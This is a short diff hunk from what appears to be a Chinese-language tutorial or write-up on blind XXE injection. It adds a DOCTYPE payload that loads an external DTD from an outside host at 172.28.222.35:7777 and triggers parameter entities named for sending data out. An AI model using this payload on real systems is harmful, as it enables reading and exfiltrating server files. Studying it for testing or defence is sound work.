@@ -68,3 +68,6 @@ Connection: close
 ### 最后
 在响应包提交的时候
 只需要在访问到外部1.dtd下载下来并且执行参数实体即可
+```dtd
+<!DOCTYPE conver [<!ENTITY % sky SYSTEM "http://172.28.222.35:7777/1.dtd"> %sky;%guc;%send;]>
+```
